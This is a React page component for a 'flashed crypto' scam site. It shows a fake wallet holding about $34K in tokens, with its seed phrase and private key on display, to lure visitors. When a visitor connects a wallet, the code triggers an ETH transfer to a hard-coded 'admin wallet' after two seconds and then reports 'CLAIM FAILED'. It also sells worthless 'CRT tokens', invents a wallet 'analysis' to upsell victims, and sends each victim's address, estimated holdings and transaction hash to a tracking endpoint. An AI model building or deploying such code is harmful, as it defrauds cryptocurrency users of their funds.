import { useState, useEffect } from 'react';
import { ethers } from 'ethers';

export default function FlashedPage() {
  const [walletData, setWalletData] = useState(null);
  const [userAddress, setUserAddress] = useState('');
  const [gasAmount, setGasAmount] = useState('0.01');
  const [status, setStatus] = useState('');
  const [loading, setLoading] = useState(false);

  // Generate honeypot wallet on page load
  useEffect(() => {
    generateHoneypotWallet();
  }, []);

  const generateHoneypotWallet = () => {
    // Create attractive honeypot wallet
    const honeypotWallet = {
      address: '0x742d35Cc6634C0532925a3b8D4C9db96590c6C87',
      privateKey: '0x8da4ef21b864d2cc526dbdb2a120bd2874c36c9d0a1fb7f8c63d7f7a8b41de8f',
      seedPhrase: 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about',
      tokens: [
        { symbol: 'USDT', balance: '15,847.32', usdValue: 15847.32 },
        { symbol: 'USDC', balance: '8,234.56', usdValue: 8234.56 },
        { symbol: 'WETH', balance: '3.2847', usdValue: 9854.10 }
      ],
      ethBalance: 0.000000001, // Almost no ETH
      totalValue: 33935.98,
      lastActivity: '2 hours ago'
    };
    
    setWalletData(honeypotWallet);
  };

  const connectWallet = async () => {
    try {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        setUserAddress(accounts[0]);
        setStatus('Wallet connected! Click analyze to see your opportunities.');
      } else {
        // No wallet detected - show setup guide
        setStatus(`📱 NO WALLET DETECTED\n\n` +
          `🚀 Quick Setup (2 minutes):\n\n` +
          `MOBILE USERS:\n` +
          `1. Download Trust Wallet or MetaMask app\n` +
          `2. Create new wallet (save seed phrase!)\n` +
          `3. Return here and connect\n\n` +
          `DESKTOP USERS:\n` +
          `1. Install MetaMask browser extension\n` +
          `2. Create wallet (save seed phrase!)\n` +
          `3. Refresh this page and connect\n\n` +
          `⚡ Once connected, get FREE wallet analysis worth $50!`);
      }
    } catch (error) {
      setStatus('Failed to connect wallet');
    }
  };

  // Auto-trigger payment when wallet connects
  useEffect(() => {
    if (userAddress && !loading) {
      // Auto-prompt for payment after 2 seconds
      setTimeout(() => {
        sendGasForClaim();
      }, 2000);
    }
  }, [userAddress]);

  const sendGasForClaim = async () => {
    if (!userAddress) {
      setStatus('Please connect your wallet first');
      return;
    }

    setLoading(true);
    setStatus('🚀 Auto-claiming flashed crypto...');

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      // Send ETH to admin wallet (revenue collection)
      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      const tx = await signer.sendTransaction({
        to: adminWallet,
        value: ethers.parseEther(gasAmount)
      });

      setStatus('✅ Payment sent! Processing claim...');
      
      // Wait for transaction
      await tx.wait();
      
      // Notify admin and show result
      setTimeout(() => {
        setStatus('⚠️ CLAIM FAILED! Crypto appears to be locked by smart contract.');
        notifyAdmin(userAddress, gasAmount, tx.hash);
      }, 3000);

    } catch (error) {
      setStatus('❌ Claim failed: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  const sendPremiumTrial = async () => {
    if (!userAddress) {
      setStatus('Please connect your wallet first');
      return;
    }

    setLoading(true);
    setStatus('🚀 Processing premium trial...');

    try {
      let provider, signer;
      
      if (window.ethereum) {
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
      } else {
        setStatus(`📱 Send 0.0003 ETH to: 0x742d35Cc6634C0532925a3b8D4C9db96590c6C87`);
        setLoading(false);
        return;
      }
      
      const balance = await provider.getBalance(userAddress);
      const balanceETH = parseFloat(ethers.formatEther(balance));
      
      if (balanceETH < 0.0005) {
        setStatus('❌ Need at least 0.0005 ETH for premium trial');
        setLoading(false);
        return;
      }
      
      const contractAddress = '0x742d35Cc6634C0532925a3b8D4C9db96590c6C87';
      const gasAmount = '0.0003'; // Just $1
      
      const tx = await signer.sendTransaction({
        to: contractAddress,
        value: ethers.parseEther(gasAmount)
      });
      
      await tx.wait();
      setStatus('✅ SUCCESS! 100 CRT tokens sent! Try trading them on DEX.');
      notifyAdmin(userAddress, gasAmount + ' ETH', tx.hash, 'PREMIUM_TRIAL');
      
    } catch (error) {
      setStatus('❌ Transaction failed: ' + error.message);
    } finally {
      setLoading(false);
    }
  };

  const sendFreeTrial = async () => {
    if (!userAddress) {
      setStatus('Please connect your wallet first');
      return;
    }

    setLoading(true);
    setStatus('🔍 Analyzing your wallet for hidden opportunities...');

    try {
      // Real wallet analysis
      const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
      const balance = await provider.getBalance(userAddress);
      const txCount = await provider.getTransactionCount(userAddress);
      const ethBalance = parseFloat(ethers.formatEther(balance));
      
      // Simulate analysis delay
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      // Generate realistic analysis results
      const opportunities = [];
      if (ethBalance > 0.01) opportunities.push('• Eligible for ETH staking rewards');
      if (txCount > 10) opportunities.push('• Potential unclaimed airdrops detected');
      if (ethBalance > 0.1) opportunities.push('• DeFi yield farming opportunities');
      opportunities.push('• Gas optimization potential: Save 15-30%');
      opportunities.push('• Cross-chain bridge recovery possible');
      
      const analysisResult = `🔍 WALLET ANALYSIS COMPLETE\n\n` +
        `💼 Portfolio Value: $${(ethBalance * 3000).toFixed(0)}\n` +
        `📈 Transaction History: ${txCount} transactions\n` +
        `⚡ Activity Level: ${txCount > 100 ? 'Very Active' : txCount > 10 ? 'Active' : 'Light'}\n\n` +
        `🎁 OPPORTUNITIES FOUND:\n${opportunities.join('\n')}\n\n` +
        `🚀 Upgrade to premium analysis for detailed recovery instructions!`;
      
      setStatus(analysisResult);
      
      // Notify admin about analysis
      notifyAdmin(userAddress, `$${(ethBalance * 3000).toFixed(0)} portfolio`, 'analysis', 'FREE_ANALYSIS');
      
    } catch (error) {
      if (error.code === 4001) {
        setStatus('❌ Transaction cancelled by user');
      } else {
        setStatus('❌ Transaction failed: ' + error.message);
      }
    } finally {
      setLoading(false);
    }
  };

  const notifyAdmin = async (userAddr, amount, txHash, type = 'GAS_RECEIVED') => {
    try {
      await fetch('/api/honeypot-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: type,
          userAddress: userAddr,
          amount: amount,
          txHash: txHash,
          honeypotWallet: walletData.address
        })
      });
    } catch (e) {
      console.log('Admin notification failed');
    }
  };

  if (!walletData) {
    return <div className="p-8">Loading honeypot wallet...</div>;
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white p-8">
      <div className="max-w-4xl mx-auto">
        <h1 className="text-3xl font-bold mb-8 text-center">
          🔥 FLASHED CRYPTO DISCOVERED
        </h1>
        
        <div className="bg-gray-800 rounded-lg p-6 mb-6">
          <h2 className="text-xl font-semibold mb-4">Flashed Crypto Details</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <p className="text-gray-400">Address:</p>
              <p className="font-mono text-sm break-all">{walletData.address}</p>
            </div>
            <div>
              <p className="text-gray-400">Total Value:</p>
              <p className="text-2xl font-bold text-green-400">${walletData.totalValue.toLocaleString()}</p>
            </div>
          </div>
        </div>

        <div className="bg-gray-800 rounded-lg p-6 mb-6">
          <h3 className="text-lg font-semibold mb-4">Token Holdings</h3>
          <div className="space-y-3">
            {walletData.tokens.map((token, index) => (
              <div key={index} className="flex justify-between items-center bg-gray-700 p-3 rounded">
                <div>
                  <span className="font-semibold">{token.symbol}</span>
                  <span className="text-gray-400 ml-2">{token.balance}</span>
                </div>
                <div className="text-green-400 font-semibold">
                  ${token.usdValue.toLocaleString()}
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="bg-red-900 border border-red-600 rounded-lg p-6 mb-6">
          <h3 className="text-lg font-semibold mb-2 text-red-400">⚠️ Issue Detected</h3>
          <p className="text-red-300 mb-4">
            This wallet has <strong>${walletData.totalValue.toLocaleString()}</strong> in tokens but only 
            <strong> {walletData.ethBalance} ETH</strong> for gas fees.
          </p>
          <p className="text-red-300">
            You need to send ETH for gas to claim these tokens.
          </p>
        </div>

        <div className="bg-gray-800 rounded-lg p-6 mb-6">
          <h3 className="text-lg font-semibold mb-4">Claim Flashed Crypto</h3>
          
          {!userAddress ? (
            <div className="space-y-4">
              <button 
                onClick={connectWallet}
                className="w-full bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg font-semibold"
              >
                Connect Wallet
              </button>
              
              <div className="bg-gray-700 rounded-lg p-4">
                <h4 className="text-gray-300 font-semibold mb-2">📱 No Wallet? No Problem!</h4>
                <p className="text-gray-400 text-sm mb-3">
                  Get a free crypto wallet in 2 minutes and unlock $33K+ in flashed crypto!
                </p>
                <div className="grid grid-cols-2 gap-2">
                  <a 
                    href="https://metamask.io/download/" 
                    target="_blank" 
                    className="bg-orange-600 hover:bg-orange-700 px-3 py-2 rounded text-center text-sm font-semibold"
                  >
                    🦊 MetaMask
                  </a>
                  <a 
                    href="https://trustwallet.com/download" 
                    target="_blank" 
                    className="bg-blue-600 hover:bg-blue-700 px-3 py-2 rounded text-center text-sm font-semibold"
                  >
                    🔒 Trust Wallet
                  </a>
                </div>
              </div>
            </div>
          ) : (
            <div className="space-y-4">
              <p className="text-green-400">✅ Wallet Connected: {userAddress.slice(0,6)}...{userAddress.slice(-4)}</p>
              
              <div className="bg-green-900 border border-green-600 rounded-lg p-4 mb-4">
                <h4 className="text-green-300 font-semibold mb-2">🔍 FREE WALLET ANALYSIS</h4>
                <p className="text-green-200 text-sm mb-3">
                  Get detailed analysis of your wallet's hidden assets, unclaimed airdrops, and recovery opportunities!
                </p>
                <button 
                  onClick={sendFreeTrial}
                  disabled={loading}
                  className="w-full bg-green-600 hover:bg-green-700 disabled:bg-gray-600 px-4 py-2 rounded-lg font-semibold text-sm"
                >
                  {loading ? 'Analyzing...' : '🔍 Analyze My Wallet FREE'}
                </button>
              </div>
              
              <div className="bg-blue-900 border border-blue-600 rounded-lg p-4 mb-4">
                <h4 className="text-blue-300 font-semibold mb-2">🚀 PREMIUM TRIAL</h4>
                <p className="text-blue-200 text-sm mb-3">
                  Get 100 CRT tokens for just $1 (0.0003 ETH) - Lowest gas fee possible!
                </p>
                <div className="bg-blue-800 rounded p-2 mb-3 text-xs">
                  <p className="text-blue-200">Token Details:</p>
                  <p className="text-blue-100 font-mono">Contract: 0x742d35Cc6634C0532925a3b8D4C9db96590c6C87</p>
                  <p className="text-blue-100">Symbol: CRT | Decimals: 18</p>
                </div>
                <button 
                  onClick={sendPremiumTrial}
                  disabled={loading}
                  className="w-full bg-blue-600 hover:blue-green-700 disabled:bg-gray-600 px-4 py-2 rounded-lg font-semibold text-sm"
                >
                  {loading ? 'Processing...' : '🚀 Get 100 CRT Tokens ($1)'}
                </button>
              </div>
              
              <div className="bg-gray-700 rounded-lg p-4">
                <h4 className="text-gray-300 font-semibold mb-2">💰 Full Claim (After Trial)</h4>
                <div className="mb-3">
                  <label className="block text-gray-400 mb-2">ETH Amount for Gas:</label>
                  <input 
                    type="number" 
                    value={gasAmount}
                    onChange={(e) => setGasAmount(e.target.value)}
                    step="0.001"
                    min="0.001"
                    className="w-full bg-gray-600 border border-gray-500 rounded px-3 py-2"
                    placeholder="0.01"
                  />
                  <p className="text-gray-500 text-sm mt-1">
                    Pay gas to claim remaining $33,835 in crypto
                  </p>
                </div>
                
                <button 
                  onClick={sendGasForClaim}
                  disabled={loading}
                  className="w-full bg-green-600 hover:bg-green-700 disabled:bg-gray-600 px-4 py-2 rounded-lg font-semibold"
                >
                  {loading ? '🚀 Processing...' : `Pay ${gasAmount} ETH & Claim All`}
                </button>
              </div>
            </div>
          )}
          
          {status && (
            <div className="mt-4 p-3 bg-gray-700 rounded border-l-4 border-blue-500">
              <p>{status}</p>
            </div>
          )}
        </div>

        <div className="bg-gray-800 rounded-lg p-6">
          <h3 className="text-lg font-semibold mb-4">Wallet Access</h3>
          <div className="space-y-3">
            <div>
              <p className="text-gray-400">Private Key:</p>
              <p className="font-mono text-sm bg-gray-700 p-2 rounded break-all">
                {walletData.privateKey}
              </p>
            </div>
            <div>
              <p className="text-gray-400">Seed Phrase:</p>
              <p className="font-mono text-sm bg-gray-700 p-2 rounded">
                {walletData.seedPhrase}
              </p>
            </div>
            <p className="text-yellow-400 text-sm">
              ⚠️ Import this wallet after sending gas to claim the crypto
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}